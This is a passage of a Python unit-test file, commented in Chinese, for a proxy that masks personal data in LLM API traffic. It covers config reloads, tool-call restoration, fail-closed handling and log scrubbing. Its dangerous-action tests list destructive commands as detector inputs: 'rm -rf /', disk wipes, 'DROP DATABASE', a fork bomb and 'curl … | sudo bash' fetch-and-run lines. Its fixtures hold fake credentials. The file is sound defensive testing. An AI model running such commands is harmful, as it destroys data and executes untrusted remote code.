    def setUp(self):
        self._root = tr._DATA_ROOT
        self._mtime = tr._cfg_mtime[0]

    def tearDown(self):
        tr._DATA_ROOT = self._root
        tr._cfg_mtime[0] = 0.0
        tr._maybe_reload(force=True)
        tr._cfg_mtime[0] = self._mtime

    def test_reload_preserves_every_audit_signal(self):
        """热重载后信号键集必须与 DEFAULT_AUDIT_SIGNALS 完全一致，不能少任何一个。"""
        self._reload_with({})
        self.assertEqual(
            set(tr.AUDIT_SIGNALS), set(tr.DEFAULT_AUDIT_SIGNALS),
            "热重载丢了信号：_read_settings 又抄了一份键列表？",
        )

    def test_panel_defaults_cover_every_engine_signal(self):
        """面板默认配置的信号键集必须等于引擎的，否则 UI 开关与实际行为不一致。

        少一个键时，面板 Switch 读到 undefined 显示为「关」，引擎却按默认 True 在跑。
        """
        panel_signals = set(panel.default_config()["audit"]["signals"])
        self.assertEqual(panel_signals, set(tr.DEFAULT_AUDIT_SIGNALS))

    def test_user_disabled_signal_survives_reload(self):
        """用户显式关掉的信号要生效；未配置的仍回落默认开。"""
        self._reload_with({"audit": {"signals": {"dangerous_action": False}}})
        self.assertIs(tr.AUDIT_SIGNALS["dangerous_action"], False)
        self.assertIs(tr.AUDIT_SIGNALS["response_poison"], True)

    def test_whole_word_switch_reaches_the_engine(self):
        """整词匹配开关必须真正改变匹配行为，不是只写进 config 就算数。

        对照组是同一个词表、只切开关：整词开时 Rain 里的 ai 不该被替换。
        """
        cfg = {"custom_words": {"AI": "代号"}}
        try:
            self._reload_with(dict(cfg, sensitive_word_whole=["AI"]))
            self.assertEqual(tr.SENSITIVE_WORD_WHOLE, {"AI"})
            tr._new_session("whole-on")
            on = tr.mask("Rain AI", "whole-on")

            self._reload_with(dict(cfg, sensitive_word_whole=[]))
            self.assertEqual(tr.SENSITIVE_WORD_WHOLE, set())
            tr._new_session("whole-off")
            off = tr.mask("Rain AI", "whole-off")
        finally:
            pass
        self.assertTrue(on.startswith("Rain "), f"整词开却切了词内：{on}")
        self.assertFalse(off.startswith("Rain "), f"整词关却没切词内：{off}")

    def test_whole_word_list_is_trimmed_and_compacted(self):
        """空串和两侧空白来自 UI 直接透传，必须在读配置时清掉。"""
        self._reload_with({"sensitive_word_whole": [" 重庆 ", "", "  ", "AI"]})
        self.assertEqual(tr.SENSITIVE_WORD_WHOLE, {"重庆", "AI"})


class DangerousActionSignalTests(unittest.TestCase):
    """S9 危险动作检测（2026-08-15 用户提出后新增）。

    定位是「告警 + 留证」，不是拦截：代理只能改/挡 HTTP 响应，做不到「暂停问一句」；
    客户端本身有权限确认，重复拦截是噪音；而误报一次用户就会把整个功能关掉。
    所以这组用例里，「不该报的一条都不许报」比「该报的全报到」更重要。
    """

    # S9 的严重度契约在「审计误报治理」一轮里反转过：
    # 命中形态 → 仍然检出（kind 不变）；但只有**被叫去执行**时才给规则本身的
    # 严重度，纯提及一律 LOW（默认 severity_floor=MEDIUM 下不入库）。
    # 理由是真实上游实测：编程助手讨论危险命令是日常业务，按「像不像讲解」
    # 降级三轮里挂两轮，按「有没有叫你执行」判则稳定。
    # S9 的严重度契约在「去硬编码」一轮里定死为**恒 LOW**：
    # 检测命令**形态**是客观的（rm + 递归标志 + 根路径是语法结构），
    # 判断**意图**（讲解 vs 命令你执行）不是——那是自然语言理解，正则只能
    # 穷举措辞，而措辞是无限集合。所以 S9 只记不报：默认 severity_floor=MEDIUM
    # 下一条都不入库，调到 LOW 才能查。真正的控制点在客户端的命令确认。
    def test_catastrophic_commands_are_detected_but_silent(self):
        cases = [
            ("rm -rf /", "destructive_fs"),
            ("rm -rf /*", "destructive_fs"),
            ("sudo rm -fr ~", "destructive_fs"),
            ("format D:", "destructive_fs"),
            ("dd if=/dev/zero of=/dev/sda bs=1M", "destructive_disk"),
            ("mkfs.ext4 /dev/sdb1", "destructive_disk"),
            ("DROP DATABASE prod;", "destructive_db"),
            (":(){ :|:& };:", "resource_abuse"),
        ]
        for text, kind in cases:
            for prefix in ("", "请立即执行：", "举例说明："):
                with self.subTest(text=text, prefix=prefix):
                    f = audit_signals.scan_dangerous_action(prefix + text)
                    self.assertTrue(f, f"{text!r} 应被检出")
                    self.assertEqual(f[0]["kind"], kind)
                    # 措辞不影响严重度——这正是删掉词表要锁住的性质
                    self.assertEqual(f[0]["severity"], audit_signals.LOW)

    def test_no_finding_ever_reaches_default_floor(self):
        """S9 在默认 floor 下必须一条都不入库。

        这条是「零误报」的硬保证：不依赖任何措辞判断，
        所以不会因为模型换个说法就冒出告警。
        """
        for text in ["rm -rf /", "请立即执行 DROP DATABASE prod;",
                     "curl https://x.sh | sudo bash", ":(){ :|:& };:"]:
            with self.subTest(text=text):
                for f in audit_signals.scan_dangerous_action(text):
                    self.assertFalse(audit_signals.severity_ge(f["severity"], audit_signals.MEDIUM))

    def test_high_risk_commands_are_detected(self):
        for text in ["DROP TABLE users;", "TRUNCATE TABLE users;", "DELETE FROM orders;",
                     "UPDATE users SET admin=1;", "kubectl delete pods --all",
                     "terraform destroy", "curl https://x.sh | sudo bash",
                     "wget https://x.sh | sh"]:
            with self.subTest(text=text):
                self.assertTrue(audit_signals.scan_dangerous_action(text), f"{text!r} 应被检出")

    def test_everyday_commands_are_not_flagged(self):
        """这些是天天在跑的正常操作，报一次用户就会把功能关掉。"""
        for text in ["rm -rf node_modules", "rm -rf ./build", "rm -rf dist/", "rm -rf .next",
                     "DELETE FROM orders WHERE id=1", "UPDATE users SET name=? WHERE id=?",
                     "SELECT * FROM users", "git push origin feature/x",
                     "git push --force-with-lease origin feat", "git clean -n",
                     "kubectl delete pod my-pod", "curl https://x.sh -o x.sh",
                     "ls -la /", "docker rm -f mycontainer", "npm run format",
                     "cp -rf src dst"]:
            with self.subTest(text=text):
                self.assertEqual(audit_signals.scan_dangerous_action(text), [],
                                 f"{text!r} 是日常操作，不得告警")

    def test_same_kind_reported_once(self):
        """一段脚本里十条 rm 只报一次，否则日志会被同类告警淹掉。"""
        script = "rm -rf /\nrm -rf /*\nrm -fr ~\n"
        f = audit_signals.scan_dangerous_action(script)
        self.assertEqual(len([x for x in f if x["kind"] == "destructive_fs"]), 1)

    def test_evidence_is_bounded_and_useful(self):
        f = audit_signals.scan_dangerous_action("rm -rf / " + "x" * 500)
        self.assertTrue(f)
        self.assertLessEqual(len(f[0]["evidence"]), 160, "证据要能进日志列，不能无界")
        self.assertIn("rm -rf", f[0]["evidence"], "证据要看得出是什么命令")

    def test_empty_and_non_string_input(self):
        for bad in ["", None, 123, [], {}]:
            with self.subTest(bad=bad):
                self.assertEqual(audit_signals.scan_dangerous_action(bad), [])

    def test_signal_enabled_by_default(self):
        self.assertTrue(tr.AUDIT_SIGNALS.get("dangerous_action"),
                        "默认必须开——只告警无成本，关掉就等于没做")


class PlaintextWordRecordingTests(unittest.TestCase):
    """高级设置「敏感词统计记录明文」开关：关掉后库里必须一条明文都没有。"""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.old_db = event_store.DB_PATH
        self.old_flag = event_store.RECORD_PLAINTEXT_WORDS
        event_store.DB_PATH = self.tmp / "ev.sqlite3"
        event_store._reset_writer()
        event_store.init_db()

    def tearDown(self):
        event_store.set_record_plaintext_words(self.old_flag)
        event_store._reset_writer()
        event_store.DB_PATH = self.old_db
        __import__("shutil").rmtree(self.tmp, ignore_errors=True)

    def _write_mask_event(self):
        event_store.append_event({
            "ts": time.time(), "type": "MASK", "count": 1, "host": "api.example.com",
            "items": [{"label": "EMAIL", "original": "zhang.san@example.com",
                       "preview": "z***n@e***e.com"}],
        })

    def _words(self):
        with closing_conn() as conn:
            return [r[0] for r in conn.execute("SELECT word FROM daily_words").fetchall()]

    def test_on_records_plaintext(self):
        """默认开：排行榜要能看出到底是哪个词，打码 preview 排出来没有信息量。"""
        event_store.set_record_plaintext_words(True)
        self._write_mask_event()
        self.assertIn("zhang.san@example.com", self._words())

    def test_off_records_only_preview(self):
        """关掉后 daily_words 一条明文都不能有——这是用户选择的隐私档位，不能打折。"""
        event_store.set_record_plaintext_words(False)
        self._write_mask_event()
        words = self._words()
        self.assertIn("z***n@e***e.com", words)
        self.assertNotIn("zhang.san@example.com", words)

    def test_off_then_stats_api_has_no_plaintext(self):
        """端到端：关掉后 today_stats 下发的 top_words 里不得出现明文。"""
        event_store.set_record_plaintext_words(False)
        self._write_mask_event()
        st = event_store.today_stats(now=time.time())
        blob = json.dumps(st, ensure_ascii=False)
        self.assertNotIn("zhang.san@example.com", blob)

    def test_credential_items_never_carry_plaintext(self):
        """凭据类 items 本身就没有 original，开关开着也只能落 preview。"""
        event_store.set_record_plaintext_words(True)
        event_store.append_event({
            "ts": time.time(), "type": "MASK", "count": 1, "host": "api.example.com",
            "items": [{"label": "SECRET", "preview": "sk-***", "sha256": "deadbeef"}],
        })
        words = self._words()
        self.assertEqual(words, ["sk-***"])

    def test_panel_config_roundtrip_defaults_on(self):
        """配置默认必须是开，且 normalize 后 key 存在（前端开关要有初值）。"""
        cfg = panel.normalize_config({})
        self.assertTrue(cfg["record_plaintext_words"])
        cfg2 = panel.normalize_config({"record_plaintext_words": False})
        self.assertFalse(cfg2["record_plaintext_words"])


class ModelPriceNormalizeTests(unittest.TestCase):
    """自定义模型价格归一化。

    起因：_normalize_model_prices 用了 math.isfinite 但 panel.py 从没 import math，
    默认 model_prices 为空 dict → 循环体一次都不进 → 谁也没发现；用户在设置页填
    第一条自定义价格的瞬间才 NameError，保存必失败、功能整个不可用。
    这里的用例必须让循环体真的跑到 isfinite 那一行，否则又是白测。
    """

    def test_valid_price_passes_and_rounds(self):
        out = panel._normalize_model_prices({"gpt-4o": {"input": 2.5, "output": 10}})
        self.assertEqual(out, {"gpt-4o": {"input": 2.5, "output": 10.0}})

    def test_non_finite_rejected(self):
        """inf/nan 会污染后续费用求和（总额变 nan，整个统计页显示 NaN）。"""
        out = panel._normalize_model_prices({
            "a": {"input": float("inf"), "output": 1},
            "b": {"input": float("nan"), "output": 1},
            "c": {"input": 1, "output": float("inf")},
        })
        self.assertEqual(out, {})

    def test_negative_and_malformed_rejected(self):
        out = panel._normalize_model_prices({
            "neg": {"input": -1, "output": 1},
            "notdict": "x",
            "": {"input": 1, "output": 1},
            "   ": {"input": 1, "output": 1},
            "bad": {"input": "abc", "output": 1},
        })
        self.assertEqual(out, {})

    def test_key_trimmed(self):
        out = panel._normalize_model_prices({"  gpt-4o-mini  ": {"input": 0.15, "output": 0.6}})
        self.assertIn("gpt-4o-mini", out)

    def test_reachable_through_normalize_config(self):
        """走完整 normalize_config，确认 import 缺失这类错误在配置加载路径上会被抓到。"""
        cfg = panel.normalize_config({"model_prices": {"claude-opus-5": {"input": 15, "output": 75}}})
        self.assertEqual(cfg["model_prices"]["claude-opus-5"], {"input": 15.0, "output": 75.0})


def closing_conn():
    from contextlib import closing as _c
    return _c(event_store._connect())


if __name__ == "__main__":
    unittest.main()


class SessionIdWidthTests(unittest.TestCase):
    """会话 ID 位宽（2026-08-15 审计项）。

    sid 是脱敏映射表的关联键。两个并存会话撞上同一个 sid，等于把别人的原文
    还原进你的响应里——在一个以「不泄漏」为卖点的产品上，这是最严重的一类故障，
    不能靠「概率很低」糊过去。

    原实现取 uuid4 的前 8 位十六进制 = 32 bit。按生日问题，1 万请求碰撞概率约 1.2%、
    2 万约 4.6%、10 万约 69%，而重度 Agent 用户一天就能跑到十万量级。
    """

    def test_sid_is_64_bit(self):
        """必须是 16 位十六进制（64 bit）。"""
        tr_file = (ROOT / "engine" / "transparent.py") if (ROOT / "engine" / "transparent.py").exists() else (ROOT / "transparent.py")
        src = tr_file.read_text(encoding="utf-8")
        self.assertIn("uuid.uuid4().hex[:16]", src)
        self.assertNotIn("uuid.uuid4().hex[:8]", src, "sid 位宽被改回 32 bit 了")

    def test_no_collision_at_realistic_volume(self):
        """20 万个 sid 不应出现碰撞（32 bit 时此规模几乎必撞）。"""
        import uuid as _uuid
        n = 200_000
        seen = {_uuid.uuid4().hex[:16] for _ in range(n)}
        self.assertEqual(len(seen), n, "64 bit 下这个量级不该有碰撞")


class ParallelToolCallSlotTests(unittest.TestCase):
    """并行工具调用的流式还原槽位（SHIELD-TOOLIDX-001，2026-08-15 外部审计发现）。

    OpenAI 流式协议里，每个 chunk 的 delta.tool_calls 通常只带一个元素，靠元素里的
    index 标明「这段增量属于第几个工具」。原实现用数组下标当槽位键，于是 index=0 和
    index=1 的增量都拿到下标 0，两个工具共用一个跨包缓冲——占位符被切在包边界时，
    两边的半截会互相串，客户端拿到的工具参数直接 JSON 解析失败。

    之前的真实调用测试没盖住：那条「并行两个工具」用的是非流式，压根没走这段代码。
    """

    def _keys(self, data):
        return [s[0] for s in tr._sse_text_slots(data)]

    def test_slot_key_follows_tool_index_not_array_position(self):
        """两个 chunk 各带一个元素、index 不同 → 槽位键必须不同。"""
        chunk_a = {"choices": [{"index": 0, "delta": {"tool_calls": [
            {"index": 0, "function": {"arguments": '{"phone":"'}}]}}]}
        chunk_b = {"choices": [{"index": 0, "delta": {"tool_calls": [
            {"index": 1, "function": {"arguments": '{"email":"'}}]}}]}
        ka, kb = self._keys(chunk_a), self._keys(chunk_b)
        self.assertEqual(ka, ["c0.tool0"])
        self.assertEqual(kb, ["c0.tool1"], "index=1 的增量被当成了第 0 个工具，缓冲会串")
        self.assertNotEqual(ka, kb)

    def test_falls_back_to_array_position_when_index_missing(self):
        """少数上游不下发 index，此时回落数组下标，不能整段不还原。"""
        chunk = {"choices": [{"index": 0, "delta": {"tool_calls": [
            {"function": {"arguments": "a"}}, {"function": {"arguments": "b"}}]}}]}
        self.assertEqual(self._keys(chunk), ["c0.tool0", "c0.tool1"])

    def test_legacy_function_call_arguments_get_a_slot(self):
        """旧式 function_call（2023 协议）也要有槽位，否则跨包完全不还原。"""
        chunk = {"choices": [{"index": 0, "delta": {
            "function_call": {"name": "send_sms", "arguments": '{"phone":"'}}}]}
        self.assertIn("c0.fcall", self._keys(chunk))

    def test_parallel_tools_split_across_chunks_restore_independently(self):
        """端到端：两个工具的占位符各自被切成两半交错下发，还原后不许串。"""
        sid = "tool-idx-e2e"
        tr._new_session(sid)
        tr.CUSTOM_WORDS.clear()
        tr.BUILTIN_RULES = dict(tr.DEFAULT_BUILTIN_RULES)
        tr._CUSTOM_WORD_RX_CACHE.clear()
        phone, email = "13800138000", "zhang.san@internal-corp.com"
        tok_p = tr.mask(phone, sid)
        tok_e = tr.mask(email, sid)
        # 各切两半，交错发（真实流式里非常常见）
        halves = [(0, tok_p[:6]), (1, tok_e[:6]), (0, tok_p[6:]), (1, tok_e[6:])]
        got = {0: "", 1: ""}
        for tool_index, piece in halves:
            data = {"choices": [{"index": 0, "delta": {"tool_calls": [
                {"index": tool_index, "function": {"arguments": piece}}]}}]}
            for key, text, _setter, escape in tr._sse_text_slots(data):
                got[tool_index] += tr.restore(text, sid, channel=key, escape=escape)
        # 收尾把各通道缓冲吐净（final=True）
        for tool_index in (0, 1):
            got[tool_index] += tr.restore("", sid, channel=f"c0.tool{tool_index}",
                                          escape=True, final=True)
        self.assertEqual(got[0], phone, f"工具0 还原错：{got[0]!r}")
        self.assertEqual(got[1], email, f"工具1 还原错：{got[1]!r}")


class _FakeRegKey:
    """假注册表键：单测绝不允许碰真实注册表（同「不许真实扫端口/杀进程」红线）。"""

    def __init__(self, values):
        self.values = values

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


class _FakeWinreg:
    HKEY_CURRENT_USER = object()
    KEY_READ = 1
    KEY_SET_VALUE = 2

    def __init__(self, values):
        self.values = values

    def OpenKey(self, root, path, reserved, access):
        return _FakeRegKey(self.values)

    def QueryValueEx(self, key, name):
        if name not in key.values:
            raise FileNotFoundError(name)
        return key.values[name], 1

    def DeleteValue(self, key, name):
        if name not in key.values:
            raise FileNotFoundError(name)
        del key.values[name]


class LegacyAutostartPurgeTests(unittest.TestCase):
    r"""开机自启值名迁移。

    实测故障（2026-08-17）：Run 键里只有旧值名 `LLMShield`，指向构建树里的
    `...\target\release\llm-shield.exe`。那个文件**还在**，所以「只在文件不存在时删」
    的旧规则放过了它；而 `autostart_enabled()` 认「新旧任一存在即已开启」，
    面板显示自启已开启 → 用户不会去开关它 → 新值名 `Maskit` 永远写不进去。
    结果开机拉起的是几天前的构建产物，装好的版本反而没启动。
    """

    def _purge(self, values, exists=lambda p: True):
        fake = _FakeWinreg(values)
        with mock.patch.dict(sys.modules, {"winreg": fake}), \
             mock.patch.object(panel.sys, "platform", "win32"), \
             mock.patch.object(panel.Path, "exists", lambda self: exists(str(self))):
            panel._purge_stale_legacy_autostart()
        return values

    def test_new_value_present_removes_legacy_even_if_file_exists(self):
        """新旧并存 = 旧的必然过期：同一个产品不需要两条自启项。"""
        v = self._purge({
            "Maskit": r'"C:\Program Files\Maskit\Maskit.exe" --minimized',
            "LLMShield": r'"C:\Apps\LLMShield\llm-shield.exe" --minimized',
        })
        self.assertNotIn("LLMShield", v)
        self.assertIn("Maskit", v)

    def test_legacy_pointing_at_missing_file_removed(self):
        v = self._purge(
            {"LLMShield": r'"C:\gone\llm-shield.exe" --minimized'},
            exists=lambda p: False,
        )
        self.assertEqual(v, {})

    def test_legacy_alone_with_live_file_is_kept_for_shell_to_heal(self):
        """只有旧项且文件还在时不删——删了用户就彻底没自启了。

        改指到当前 exe 是壳侧 heal_autostart() 的活（只有壳知道自己的真实路径），
        这里保留现状把决定权交出去。
        """
        val = r'"C:\Apps\LLMShield\llm-shield.exe" --minimized'
        v = self._purge({"LLMShield": val})
        self.assertEqual(v, {"LLMShield": val})

    def test_no_autostart_at_all_is_untouched(self):
        self.assertEqual(self._purge({}), {})


class ToolCorrelationIdTests(unittest.TestCase):
    """工具调用关联 ID 不分协议、不分业务区，一律不能被脱敏改坏。

    实测缺陷（2026-08-17 外部审计）：OpenAI Responses API 把协议信封放进 input[] ——
    {"input":[{"type":"function_call_output","call_id":"call_x","output":...}]}。
    input 是业务区容器，`if not in_business` 的整个豁免块不进，于是 call_id
    被当普通文本脱敏：call_ACME_9x → call_{{CUSTOMER_ed24da}}_9x，工具结果
    再也连不回上一轮函数调用。

    Chat Completions 的 tool_call_id 在 messages[] 里（非业务区）所以一直没事——
    两边行为不一致纯属遗漏。这组用例把三种协议一起锁死。
    """

    def setUp(self):
        tr.sessions.clear()
        tr._RECENT_FWD.clear()
        tr._RECENT_REV.clear()
        tr._RECENT_SUFFIX.clear()
        tr.CUSTOM_WORDS.clear()
        tr.CUSTOM_WORDS.update({"ACMECORP": "CUSTOMER"})
        tr.SENSITIVE_DISABLED = set()
        tr.SENSITIVE_WORD_DISABLED = {}
        tr.BUILTIN_RULES = dict(tr.DEFAULT_BUILTIN_RULES)
        tr._CUSTOM_WORD_RX_CACHE.clear()

    def _mask(self, body):
        return tr._mask_tree(json.loads(json.dumps(body)), "corr-sid", None, None, (), 0)

    def test_responses_api_call_id_survives(self):
        out = self._mask({"model": "gpt-5", "input": [
            {"type": "function_call_output", "call_id": "call_ACMECORP_9x",
             "output": "客户 ACMECORP 的订单已确认"},
            {"role": "user", "content": "ACMECORP 的情况"},
        ]})
        first = out["input"][0]
        self.assertEqual(first["call_id"], "call_ACMECORP_9x", "call_id 被改 = 工具链断")
        # 协议判别字段同样不能动
        self.assertEqual(first["type"], "function_call_output")
        self.assertEqual(out["input"][1]["role"], "user")
        # 但正文必须照常脱敏——豁免只针对关联 ID，不能把整个 input 放过
        self.assertNotIn("ACMECORP", first["output"])
        self.assertNotIn("ACMECORP", out["input"][1]["content"])

    def test_chat_and_anthropic_correlation_ids_survive(self):
        out = self._mask({"messages": [
            {"role": "tool", "tool_call_id": "call_ACMECORP_1", "content": "ACMECORP"},
            {"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": "toolu_ACMECORP_2", "content": "ACMECORP"}]},
        ]})
        self.assertEqual(out["messages"][0]["tool_call_id"], "call_ACMECORP_1")
        self.assertEqual(out["messages"][1]["content"][0]["tool_use_id"], "toolu_ACMECORP_2")
        self.assertNotIn("ACMECORP", out["messages"][0]["content"])

    def test_business_object_id_still_scanned(self):
        """豁免只放行关联 ID。业务对象里的 id 照常扫描——这是 AGENTS 约束 12 的验收点，
        不能借着修 call_id 把整类 id 放过。"""
        out = self._mask({"input": {"customer": {
            "id": "ACMECORP", "call_id": "call_ACMECORP_1", "note": "ACMECORP"}}})
        cust = out["input"]["customer"]
        self.assertNotIn("ACMECORP", cust["id"], "业务对象 customer.id 必须仍被脱敏")
        self.assertNotIn("ACMECORP", cust["note"])
        self.assertEqual(cust["call_id"], "call_ACMECORP_1")

    def test_correlation_ids_declared_in_one_place(self):
        """三种协议的关联 ID 必须集中声明，避免下次新增协议时又漏一个。"""
        self.assertEqual(tr._MASK_CORRELATION_ID_KEYS,
                         {"tool_call_id", "tool_use_id", "call_id"})


class ObjectKeyMaskingBoundaryTests(unittest.TestCase):
    """对象**键名**不脱敏是有意保留的边界，这里把它钉成显式契约。

    背景：`{"13800138000": "..."}` 这种「PII 当键名」的载荷不会被脱敏。之所以不修：
    键名承载协议结构（content/type/role/messages…），而脱敏只按文本特征匹配、无法区分
    「数据键」与「结构键」——用户加个 "con" 之类的短自定义词就会命中 content，
    结果是**每个请求**的协议骨架当场崩掉。误伤面大于收益，故保留边界。
    本用例同时锁住「真正常见的 PII-as-key 场景已被覆盖」：工具参数是 JSON 字符串，
    走 str 分支整段扫描，键名也在其中。
    """

    def setUp(self):
        tr.sessions.clear()
        tr._RECENT_FWD.clear()
        tr._RECENT_REV.clear()
        tr._RECENT_SUFFIX.clear()
        tr.CUSTOM_WORDS.clear()
        tr.SENSITIVE_DISABLED = set()
        tr.SENSITIVE_WORD_DISABLED = {}
        tr.BUILTIN_RULES = dict(tr.DEFAULT_BUILTIN_RULES)
        tr._CUSTOM_WORD_RX_CACHE.clear()

    def test_pii_as_object_key_is_a_known_boundary(self):
        out = tr._mask_tree({"metadata": {"13800138000": "x"}}, "key-boundary-sid", None, None, (), 0)
        # 现状：键名原样透传（若将来收紧这条边界，此断言会红，提醒同步更新文档与还原侧）
        self.assertEqual(list(out["metadata"].keys()), ["13800138000"])

    def test_protocol_keys_are_never_rewritten(self):
        """协议骨架必须逐字保留——这是「不脱敏键名」换来的核心保证。"""
        tr.CUSTOM_WORDS.update({"con": "TERM", "typ": "TERM", "rol": "TERM"})
        tr._CUSTOM_WORD_RX_CACHE.clear()
        out = tr._mask_tree(
            {"messages": [{"role": "user", "content": "con typ rol"}], "model": "gpt-5"},
            "key-boundary-sid-2", None, None, (), 0)
        self.assertEqual(sorted(out.keys()), ["messages", "model"])
        self.assertEqual(sorted(out["messages"][0].keys()), ["content", "role"])

    def test_tool_arguments_json_string_covers_its_keys(self):
        """工具参数是 JSON **字符串**：整段扫描，键名同样被脱敏——最常见的
        PII-as-key 形状其实没漏。"""
        tr.CUSTOM_WORDS.update({"张三": "PERSON"})
        tr._CUSTOM_WORD_RX_CACHE.clear()
        out = tr._mask_tree(
            {"messages": [{"role": "assistant", "tool_calls": [
                {"function": {"name": "lookup", "arguments": '{"张三": "备注"}'}}]}]},
            "key-boundary-sid-3", None, None, (), 0)
        args = out["messages"][0]["tool_calls"][0]["function"]["arguments"]
        self.assertNotIn("张三", args)
        self.assertIn("{{", args)


class FailClosedCaptureModeTests(unittest.TestCase):
    """fail-closed 语义不许随 capture_mode 分裂。

    实测缺陷（2026-08-17 外部审计）：判据写的是 `FAIL_CLOSED and up_name`，
    而 up_name 只在 reverse 模式有值，explicit/local 恒为 ""。于是那两个模式下
    未知形态的 JSON **无论 fail_closed 开没开都原文放行**，
    与「fail-closed 绝不放行原文上行」的产品承诺直接冲突。

    走到那个判定时两种模式其实都已证明在用户配置的路由上（reverse 匹配到 upstream，
    explicit/local 通过 is_target），所以判据只该看 fail_closed 本身。
    """

    def setUp(self):
        tr.sessions.clear()
        tr._RECENT_FWD.clear()
        tr._RECENT_REV.clear()
        tr._RECENT_SUFFIX.clear()
        tr.CUSTOM_WORDS.clear()
        tr.CUSTOM_WORDS.update({"SENSITIVEPERSONXYZ": "NAME"})
        tr.SENSITIVE_DISABLED = set()
        tr.SENSITIVE_WORD_DISABLED = {}
        tr.BUILTIN_RULES = dict(tr.DEFAULT_BUILTIN_RULES)
        tr._CUSTOM_WORD_RX_CACHE.clear()
        self._old_mode, self._old_fc = tr.CAPTURE_MODE, tr.FAIL_CLOSED

    def tearDown(self):
        tr.CAPTURE_MODE, tr.FAIL_CLOSED = self._old_mode, self._old_fc

    def _run(self, mode, fail_closed):
        """在指定模式下跑一次 request()，返回上行 body 文本。"""
        tr.CAPTURE_MODE = mode
        tr.FAIL_CLOSED = fail_closed
        # 未知形态：不含任何 _LLM_BODY_KEYS，但载有原文
        payload = {"customer": {"project": "SENSITIVEPERSONXYZ"}}
        raw = json.dumps(payload).encode()
        client_conn = None
        if mode == "reverse":
            # reverse 要真走 apply_reverse_routing：没匹配到 upstream 会 404 早返回，
            # 那样测的就不是脱敏判定而是路由了
            tr.UPSTREAMS = [{
                "name": "up-a", "port": 18709, "base_path": "/up-a",
                "target": "https://api.example.com/v1",
                "paths": ["/v1/chat/completions"],
            }]
            client_conn = SimpleNamespace(sockname=("127.0.0.1", 18709))
            host, path = "127.0.0.1", "/chat/completions"
        else:
            tr.UPSTREAMS = list(tr.DEFAULT_UPSTREAMS)
            host, path = "api.openai.com", "/v1/chat/completions"
        req = SimpleNamespace(
            method="POST", path=path, pretty_host=host, host=host,
            port=443, scheme="https", content=raw, text=raw.decode(),
            headers={"content-type": "application/json"}, pretty_url="",
        )
        flow = SimpleNamespace(request=req, response=None, metadata={},
                               client_conn=client_conn,
                               server_conn=SimpleNamespace(via=None))
        old_emit, old_reload = tr._emit, tr._maybe_reload
        try:
            tr._emit = lambda *a, **k: None
            tr._maybe_reload = lambda force=False: None
            tr.request(flow)
        finally:
            tr._emit, tr._maybe_reload = old_emit, old_reload
        return (flow.request.content or b"").decode()

    def test_explicit_mode_no_longer_leaks_under_fail_closed(self):
        for mode in ("explicit", "local"):
            with self.subTest(mode=mode):
                body = self._run(mode, fail_closed=True)
                self.assertNotIn("SENSITIVEPERSONXYZ", body,
                                 f"{mode} 模式下 fail_closed 仍放行原文上行")

    def test_reverse_mode_still_protected(self):
        body = self._run("reverse", fail_closed=True)
        self.assertNotIn("SENSITIVEPERSONXYZ", body)

    def test_fail_closed_off_keeps_passthrough(self):
        """关掉 fail_closed 是用户的显式选择，行为不能被这次修复改掉——
        否则会把顺带经过网关的普通业务接口也一起改了。"""
        for mode in ("explicit", "reverse"):
            with self.subTest(mode=mode):
                body = self._run(mode, fail_closed=False)
                self.assertIn("SENSITIVEPERSONXYZ", body)


class LogDetailReadSideScrubTests(unittest.TestCase):
    r"""日志详情读侧凭据清洗。

    写侧不再把凭据原文落库，但升级用户的历史库中可能仍留有历史数据。
    /api/logs/detail 按 id 回源时，必须确保凭据等敏感内容在读侧得到清洗。

    这一组同时守死另一半：**普通 PII 的 original 必须保留**。
    详情弹窗的定位就是「脱敏 ↔ 原文对照」，把手机号一起打掉功能就没了
    （AGENTS 约束 13：普通 PII 原文仍存本地事件库供详情弹窗对照）。
    """

    def _legacy_row(self):
        return {
            "seq": 1, "type": "MASK",
            "items": [
                {"label": "PRIVATE_KEY",
                 "original": ("-----BEGIN " + "RSA PRIVATE KEY-----\n"
                              "MIIEowIBAAKCAQEAxxx\n"
                              "-----END " + "RSA PRIVATE KEY-----")},
                {"label": "CONNSTR", "original": "postgres://admin:hunter2000@db.internal:5432/prod"},
                {"label": "API_KEY", "original": "sk-abcdef1234567890abcdef"},
                {"label": "PHONE", "original": "13800138000", "preview": "138****8000"},
                {"label": "NAME", "original": "张三", "preview": "张*"},
            ],
            "dialog": "连接串是 postgres://admin:hunter2000@db.internal:5432/prod，"
                      "联系人 13800138000，密钥 sk-abcdef1234567890abcdef",
            "resp_preview": "Authorization: Bearer abcdefghijklmnop12345",
        }

    def test_credential_originals_removed(self):
        out = panel._scrub_legacy_event(self._legacy_row())
        creds = [i for i in out["items"] if i["label"] in ("PRIVATE_KEY", "CONNSTR", "API_KEY")]
        self.assertEqual(len(creds), 3)
        for item in creds:
            self.assertNotIn("original", item, f"{item['label']} 原文仍下发")
            self.assertIn("hash", item)
            self.assertIn("length", item)
            self.assertEqual(len(item["hash"]), 16)

    def test_normal_pii_original_preserved(self):
        """不能借着修凭据把普通 PII 对照一起干掉。"""
        out = panel._scrub_legacy_event(self._legacy_row())
        by_label = {i["label"]: i for i in out["items"]}
        self.assertEqual(by_label["PHONE"]["original"], "13800138000")
        self.assertEqual(by_label["NAME"]["original"], "张三")

    def test_free_text_credentials_scrubbed_pii_kept(self):
        out = panel._scrub_legacy_event(self._legacy_row())
        self.assertNotIn("hunter2000", out["dialog"], "连接串密码仍在自由文本里")
        self.assertNotIn("sk-abcdef1234567890abcdef", out["dialog"])
        self.assertNotIn("abcdefghijklmnop12345", out["resp_preview"])
        # 普通 PII 在自由文本里照常可见
        self.assertIn("13800138000", out["dialog"])

    def test_scrub_failure_drops_body_not_leaks(self):
        """清洗异常时宁可少给字段，也不能把正文原样放出去。"""
        bad = {"seq": 2, "items": object(), "dialog": "sk-abcdef1234567890abcdef"}
        out = panel._scrub_legacy_event(bad)
        self.assertNotIn("dialog", out)
        self.assertNotIn("items", out)
        self.assertEqual(out["seq"], 2)

    def test_credential_label_sets_stay_in_sync(self):
        """凭据标签集合必须只有一个定义源，且引擎侧三处与前端两侧口径一致。

        历史上这里是「panel 复制一份、测试守同步」——结果 `event_store` 那份自己写死成
        5 个标签，少了 CONNSTR / PRIVATE_KEY：读路径（/api/stats/today/restore-items）
        会把修复前落库的连接串密码与 PEM 私钥当普通 PII 返回。现在引擎三处 import
